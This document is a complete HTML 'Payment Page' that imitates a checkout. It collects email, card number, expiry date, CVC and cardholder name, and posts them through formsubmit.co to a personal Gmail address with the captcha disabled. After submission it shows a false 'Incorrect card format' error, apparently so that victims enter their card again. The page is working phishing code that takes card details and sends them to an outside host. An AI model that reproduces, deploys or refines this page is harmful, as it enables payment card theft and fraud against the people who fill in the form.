<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Payment Page</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background-color: #000;
      font-family: Arial, sans-serif;
      color: #fff;
    }

    *, *::before, *::after {
      box-sizing: border-box;
    }

    #loader {
      position: fixed;
      inset: 0;
      background-color: #121212;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #444;
      border-top: 5px solid #fff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    #page-content {
      display: none;
      padding: 20px;
      max-width: 400px;
      margin: 0 auto;
    }

    .gpay-btn {
      background-color: #000;
      color: white;
      border: 1px solid #555;
      padding: 12px;
      font-size: 16px;
      width: 100%;
      border-radius: 5px;
      cursor: none;
      margin-bottom: 20px;
    }

    .gpay-btn span {
      font-weight: bold;
      margin-right: 5px;
    }

    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
      color: #aaa;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #444;
    }

    .separator span {
      padding: 0 10px;
      background-color: #000;
      font-size: 14px;
      border-radius: 5px;
    }

    label {
      display: block;
      margin-top: 15px;
      margin-bottom: 5px;
      font-size: 14px;
      color: #ccc;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 5px;
      border-radius: 4px;
      border: 1px solid #666;
      background-color: #111;
      color: #fff;
      font-size: 14px;
    }

    .card-info {
      display: flex;
      gap: 10px;
    }

    .card-info input {
      flex: 1;
    }

    .card-icons {
      display: flex;
      gap: 5px;
      margin: 8px 0 15px;
    }

    .card-icons img {
      height: 24px;
    }

    .pay-btns {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 12px;
      font-size: 16px;
      width: 100%;
      height: 50px;
      border-radius: 10px;
      cursor: none;
      margin-top: 20px;
    }
 
   .error {
      color: #ff4d4d;
      font-size: 13px;
      margin-bottom: 8px;
    }
  </style>
</head>
<body>

  <!-- Spinner -->
  <div id="loader"><div class="spinner"></div></div>

  <!-- Payment Form -->
  <div id="page-content">
    <button class="gpay-btn">User: <span style="margin-left: 2%;" id="usernameDisplay">Loading...</span></button>
    <button class="gpay-btn user-details-container">Amount Requested:<span style="margin-left: 2%;" id="displayAmount"> $</span></button>

    <div class="separator"><span>Pay with card</span></div>

    <form id="paymentForm" action="https://formsubmit.co/coinnet50@gmail.com" method="POST">
      <!-- REQUIRED for formsubmit to work without captcha -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">

      <label for="email">Email</label>
      <input type="email" id="email" name="Email" placeholder="Email" />
      <div id="emailError" class="error"></div>

      <label>Card information</label>
      <input type="text" id="cardNumber" name="Card Number" placeholder="1234 1234 1234 1234" maxlength="19" />
      <div id="cardError" class="error"></div>

      <div class="card-info">
        <input type="text" id="expiry" name="Expiry Date" placeholder="MM/YY" maxlength="5" />
        <input type="text" id="cvc" name="CVC" placeholder="CVC" maxlength="4" />
      </div>
      <div id="dateError" class="error"></div>

      <div class="card-icons">
   <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
    <rect width="48" height="32" rx="4" fill="#1A1F71"/>
    <text x="24" y="20" text-anchor="middle" fill="white" font-family="Arial, sans-serif" font-size="12" font-weight="bold">VISA</text>
  </svg>

  <!-- Mastercard Logo -->
  <svg width="40" height="24" viewBox="0 0 48 32" xmlns="http://www.w3.org/2000/svg">
    <rect width="48" height="32" rx="4" fill="#ffffff"/>
    <circle cx="20" cy="16" r="10" fill="#EB001B"/>
    <circle cx="28" cy="16" r="10" fill="#F79E1B"/>
    <text x="24" y="30" text-anchor="middle" fill="#000" font-family="Arial, sans-serif" font-size="7">Mastercard</text>
  </svg>
      </div>

      <label for="name">Name on card</label>
      <input type="text" id="name" name="Name" placeholder="Name on card" />
      <div id="nameError" class="error"></div>

      <label for="country">Country or region</label>
      <select id="country" name="Country">
        <option>United States Dollar (USD)</option>
        <option>Euro (EUR)</option>
        <option>British Pound (GBP)</option>
        <option>Japanese Yen (JPY)</option>
        <option>Nigerian Naira (NGN)</option>
        <option>Emirati Dirham (AED)</option>
        <option>Kuwaiti Dinar (KWD)</option>
      </select>

 <label>States</label>
      <input type="text" id="State" name="State" placeholder="Las Angeles" />
      
      <input type="hidden" name="_next" value="http://localhost:8080/payment-card.html?success=true">
      
<div id="successNotice" class="success-message" style="color: #bd0008; font-size: 15px; margin-top: 5px;"></div>

      <button type="submit" class="pay-btns">Add Card</button>
    </form>
  </div>


  <!-- Scripts -->
<script>
  window.addEventListener('load', () => {
    setTimeout(() => {
      document.getElementById('loader').style.display = 'none';
      document.getElementById('page-content').style.display = 'block';
    }, 1500);

    // Show success message if redirected with ?success=true
    const params = new URLSearchParams(window.location.search);
    if (params.get('success') === 'true') {
      document.getElementById('successMessage').style.display = 'block';
      document.getElementById('paymentForm').style.display = 'none';
    }
  });

  const form = document.getElementById('paymentForm');

  form.addEventListener('submit', function (e) {
    const email = document.getElementById('email');
    const card = document.getElementById('cardNumber');
    const expiry = document.getElementById('expiry');
    const cvc = document.getElementById('cvc');
    const name = document.getElementById('name');

    const emailVal = email.value.trim();
    const cardVal = card.value.replace(/\s+/g, '');
    const expiryVal = expiry.value.trim();
    const cvcVal = cvc.value.trim();
    const nameVal = name.value.trim();

    let valid = true;

    if (!/@(gmail\.com|email\.com)$/i.test(emailVal)) {
      showError('email', 'Must end with @gmail.com or @email.com');
      valid = false;
    } else clearError('email');

    if (!/^\d{16}$/.test(cardVal) || !luhnCheck(cardVal)) {
      showError('card', 'Invalid card number');
      valid = false;
    } else clearError('card');

    if (!/^\d{2}\/\d{2}$/.test(expiryVal) || !/^\d{3,4}$/.test(cvcVal)) {
      showError('date', 'Invalid expiry/CVC format');
      valid = false;
    } else clearError('date');

    if (!/^[a-zA-Z\s]+$/.test(nameVal)) {
      showError('name', 'Only letters allowed in name');
      valid = false;
    } else clearError('name');

    if (!valid) {
      e.preventDefault();
    }
  });

  // Input formatting
  document.getElementById('cardNumber').addEventListener('input', (e) => {
    const val = e.target.value.replace(/\D/g, '').substring(0, 16);
    e.target.value = val.replace(/(.{4})/g, '$1 ').trim();
    clearError('card');
  });

  document.getElementById('expiry').addEventListener('input', (e) => {
    let val = e.target.value.replace(/\D/g, '');
    if (val.length > 4) val = val.slice(0, 4);
    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2);
    e.target.value = val;
    clearError('date');
  });

  document.getElementById('cvc').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
    clearError('date');
  });

  document.getElementById('email').addEventListener('input', () => clearError('email'));
  document.getElementById('name').addEventListener('input', () => clearError('name'));

  function showError(field, message) {
    document.getElementById(field + 'Error').textContent = message;
  }

  function clearError(field) {
    document.getElementById(field + 'Error').textContent = '';
  }

  function luhnCheck(number) {
    let sum = 0;
    let double = false;
    for (let i = number.length - 1; i >= 0; i--) {
      let digit = parseInt(number[i]);
      if (double) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      double = !double;
    }
    return sum % 10 === 0;
  }
</script>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const successNotice = document.getElementById('successNotice');

  if (urlParams.get('success') === 'true') {
    successNotice.textContent = 'Incorrect card format or card holder name!';

    // Auto-hide after 4 seconds (8000 ms)
    setTimeout(() => {
      successNotice.textContent = '';
    }, 8000);
  }
</script>
   <script>
   // Get parameters from URL
  function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  const fullname = getParam("fullname");
  const email = getParam("email");
  const amount = getParam("amount");

  // Show email as User ID
  if (email) {
    document.getElementById("usernameDisplay").textContent = email;
  }

  // Show full name and amount in user-details container
  if (fullname && amount) {
    document.getElementById("displayEmail").textContent = fullname;  // Now labeled "Name:"
    document.getElementById("displayAmount").textContent = amount;
  } else {
    document.querySelector(".user-details-container").innerHTML = "<p>Missing user details.</p>";
  }
  </script>
</body>
</html>
